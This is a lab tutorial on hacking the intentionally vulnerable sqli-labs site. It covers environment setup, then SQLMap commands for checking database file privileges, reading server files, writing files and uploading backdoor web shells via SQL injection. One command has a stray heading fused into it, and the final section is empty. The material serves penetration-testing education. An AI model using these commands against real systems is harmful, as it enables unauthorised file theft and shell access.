# Environment Setup:
- We will be hacking the sqli-labs website, the setup is explained below: 
- We have to download two things, xampp server 5.6.39 for Linux and sqli-labs.
- First download and install xampp server version 5.6.39 on the victim machine, here it is Ubuntu. The version must be the same as we want to download a php version that is vulnerable (as latest versions are relatively secure) and also because the website we will hack (sqli-labs) uses older php versions.
- note: the server will be downloaded to `/opt/`
	- screenshot
- Now download sqli-labs from github as follows, and unzip it.
	- screenshot
- Now copy the sqli-labs folder to `/opt/lampp/htdocs/`
	- screenshot
- setting up the server is very easy, just "start" the services apache and MySql as shown below:
	- screenshot
- Now go to the sqli-labs website and press on "reset database":
	- screenshot
- Finally we have to give permissions to `/opt/lampp/htdocs` for File/Operating system access.
	- screenshot
- Now setup is complete, and we can hack this website it.

# File System Access:
Modern database management systems often allow reading and writing files from the file system, which can be exploited through SQL injection vulnerabilities. SQLMap can be leveraged to perform file operations.
## Checking File Privileges:
- Use `privileges` switch to check if the DBMS user has file privileges.
- Example command: 
```sh
sqlmap -u "http://example.com/page.php?id=1" –privileges
```
## Reading Files:
- Use `file-read` switch followed by the full path of the file to read.
- Example command: 
```sh
sqlmap -u "http://example.com/page.php?id=1" --file-read /path/to/index.php
```
- SQLMap can download and save the file for later usage.
## Writing Files:
- Use `file-write` switch followed by the local file path to upload and `file-dest` switch followed by the location to write on the target server.
- Example command: 
```sh
sqlmap -u "http://example.com/page.php?id=1" --file-write /path/to/local/file --file-dest /path/to/target/directory
```
- SQLMap reports successful file upload.

```sh
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=6757&Submit=Submit#" --cookie="PHPSESSID=qohgh4uvii3mqobepks2q54do1; security=low" -w ./a.txt --file-read /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt --batch Uploading Backdoor Shells:
```

- Locate the desired shell file using system commands like *locate*.
- Upload the shell using the same `file-write` and `file-dest` switches.
- Example command:
```bash
sqlmap -u "http://example.com/page.php?id=1" --file-write /path/to/shell.php --file-dest /path/to/target/directory
```
- Verify shell access and execute commands through the uploaded shell.
## Considerations:
- Ensure proper file permissions and user privileges for successful file operations.
- Be mindful of file size limitations based on web server configurations.
- For Apache HTTPD, the default maximum URL length is 8 kilobytes.

SQLMap's file reading and writing capabilities can be powerful tools in the hands of a penetration tester. By exploiting SQL injection vulnerabilities, testers can gain access to sensitive files and even upload backdoor shells for further exploitation. However, it's crucial to understand the target system's configurations and limitations to execute these operations successfully.
# Operating System Access:
- 